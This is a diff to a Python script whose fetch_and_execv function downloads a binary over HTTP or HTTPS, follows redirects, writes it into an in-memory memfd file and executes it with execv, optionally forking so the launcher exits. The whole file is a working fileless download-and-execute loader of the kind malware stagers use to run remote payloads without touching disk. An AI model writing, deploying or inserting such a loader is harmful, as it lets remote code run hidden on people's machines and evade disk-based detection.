@@ -11,6 +11,34 @@ from ctypes import CDLL
 from os import execv, fork, environ
 from http import client as http_client
 from sys import argv, exit as sys_exit
+from urllib.parse import urlparse
+from typing import Union
+
+
+def parse_url(url: str):
+    ports = {"http": 80, "https": 443}
+
+    parsed = urlparse(url)
+
+    host, port_str = parsed.netloc.split(":", 1) if ":" in parsed.netloc else\
+        (parsed.netloc, ports[parsed.scheme])
+
+    return parsed.scheme, host, int(port_str), f"{parsed.path}?{parsed.query}"
+
+
+def get(protocol: str, host: str, port: int, path: str) ->\
+    http_client.HTTPResponse:
+    client: Union[http_client.HTTPConnection, http_client.HTTPSConnection]
+
+    if protocol == "https":
+        client = http_client.HTTPSConnection(host, port)
+    elif protocol == "http":
+        client = http_client.HTTPConnection(host, port)
+    else:
+        raise ValueError("Invalid URL")
+
+    client.request("GET", path)
+    return client.getresponse()
 
 
 def fetch_and_execv(url: str, params: list[str]):
@@ -23,30 +51,19 @@ def fetch_and_execv(url: str, params: list[str]):
         params (list[str]): list of command line arguments for the executable
     """
 
-    # parse url
-    protocol, uri = url.split("://", 1)
-    host_port, location = uri.split("/", 1)
-    host, port_str = host_port.split(":", 1) if ":" in host_port else\
-        (host_port, 443 if protocol == "https" else 80)
-    port = int(port_str)
+    res = get(*parse_url(url))
+    c = res.read()
+    if 300 <= res.code < 400:
+        location = res.getheader("Location")
+        if not location:
+            raise ValueError("Invalid response...")
 
-    # connect and fetch executable
-    print(host, port)
-    if protocol == "http":
-        client = http_client.HTTPConnection(host, port)
-    elif protocol == "https":
-        client = http_client.HTTPSConnection(host, port)
-    else:
-        raise NotImplementedError(f"cannot handle '{protocol}'")
-
-    client.connect()
-    client.request("GET", location)
-    res = client.getresponse().read()
+        fetch_and_execv(location, params)
 
     # create memfd, write binary into it and execute
     path = f"/proc/self/fd/{CDLL('libc.so.6').memfd_create('a', 0)}"
     with open(path, "wb+") as memfile:
-        memfile.write(res)
+        memfile.write(c)
 
     if environ.get("FORK") and fork():
         sys_exit()
